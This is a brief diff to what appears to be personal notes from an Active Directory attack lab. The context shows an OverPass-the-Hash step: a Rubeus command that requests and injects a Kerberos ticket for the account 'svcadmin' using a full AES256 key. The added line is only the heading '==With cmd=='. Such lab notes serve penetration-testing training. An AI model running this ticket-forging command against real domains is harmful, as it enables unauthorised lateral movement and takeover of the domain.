@@ -244,3 +244,4 @@ Finally we can use the OverPass-the-Hash technique to access on dcorp-dc
 ```powershell
 Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
+==With cmd==
